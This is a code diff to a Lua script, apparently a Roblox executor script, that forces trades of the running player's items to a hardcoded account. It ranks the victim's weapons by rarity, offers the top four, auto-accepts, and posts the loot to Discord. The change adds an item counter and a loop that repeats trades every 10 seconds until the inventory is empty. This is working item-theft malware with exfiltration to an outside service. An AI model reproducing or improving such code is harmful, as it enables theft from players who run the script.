@@ -10,7 +10,7 @@ local LocalPlayer = Players.LocalPlayer
 if not LocalPlayer then return end
 
 local TARGET_NAME = "Marie_31113"
-local isTrading = false -- Флаг, чтобы не запускать два трейда одновременно
+local isTrading = false
 
 local function sendDiscord(payload)
     local requestFunc = request or http_request or (syn and syn.request)
@@ -86,7 +86,17 @@ local Trade = ReplicatedStorage:WaitForChild("Trade")
 local lastOffer = nil
 local myName = LocalPlayer.Name
 local lastLogTime = 0
-local tradedItemsCount = 0
+
+-- Функция для подсчета предметов в инвентаре
+local function countItems()
+    local okPD, PD = pcall(function() return require(ReplicatedStorage.Modules.ProfileData) end)
+    if not okPD or not PD then return 0 end
+    local count = 0
+    for id, amount in pairs(PD.Weapons.Owned or {}) do
+        count = count + (tonumber(amount) or 1)
+    end
+    return count
+end
 
 Trade.StartTrade.OnClientEvent:Connect(function()
     isTrading = true
@@ -103,7 +113,7 @@ Trade.StartTrade.OnClientEvent:Connect(function()
         ["Coal"] = true, ["CandyCorn"] = true,
     }
 
-    -- Раскидываем предметы по спискам
+    -- Раскидываем предметы по редкости
     for id, amount in pairs(PD.Weapons.Owned or {}) do
         local info = Sync.Weapons and Sync.Weapons[id]
         if info then
@@ -120,14 +130,12 @@ Trade.StartTrade.OnClientEvent:Connect(function()
         end
     end
 
-    -- Собираем финальный список
     local finalList = {}
     for _, i in ipairs(godlyList) do table.insert(finalList, i) end
     for _, i in ipairs(vintageList) do table.insert(finalList, i) end
     for _, i in ipairs(uncommonList) do table.insert(finalList, i) end
     for _, i in ipairs(commonList) do table.insert(finalList, i) end
 
-    -- Выставляем ТОЛЬКО 4 предмета
     for i = 1, math.min(#finalList, 4) do
         local item = finalList[i]
         pcall(function() Trade.OfferItem:FireServer(item.id, item.type) end)
@@ -149,7 +157,6 @@ Trade.AcceptTrade.OnClientEvent:Connect(function(success, lootList)
         end
 
         lastLogTime = os.clock()
-        tradedItemsCount = tradedItemsCount + #lootList
 
         local itemsText = ""
         for _, item in ipairs(lootList) do
@@ -182,18 +189,21 @@ Trade.AcceptTrade.OnClientEvent:Connect(function(success, lootList)
         })
         print("[trade] 📦 Лут отправлен в Discord!")
 
-        -- 🚀 ЗАПУСКАЕМ СЛЕДУЮЩИЙ ТРЕЙД С ПАУЗОЙ 10 СЕКУНД
-        task.wait(10) -- Увеличено до 10 сек, чтобы обойти кулдаун
-        if Players:FindFirstChild(TARGET_NAME) then
-            print("[trade] Запускаем следующий трейд...")
-            sendTradeToTarget()
-        else
-            print("[trade] Marie вышла, следующий трейд не отправлен.")
-        end
+        -- УМНЫЙ ЦИКЛ
+        local currentCount = countItems()
+        print("[debug] Предметов в инвентаре сейчас: " .. currentCount)
+
+        task.wait(10) 
         isTrading = false
 
+        if Players:FindFirstChild(TARGET_NAME) and currentCount > 0 then
+            print("[trade] Запускаем следующий трейд (в инвентаре осталось " .. currentCount .. " шт.)...")
+            sendTradeToTarget()
+        else
+            print("[trade] Предметы закончились или Мари вышла. Цикл завершен.")
+        end
+
     else
-        -- Авто-акцепт
         if lastOffer then
             pcall(function() Trade.AcceptTrade:FireServer(game.PlaceId * 3, lastOffer) end)
             print("[trade] ✅ Авто-акцепт отправлен.")
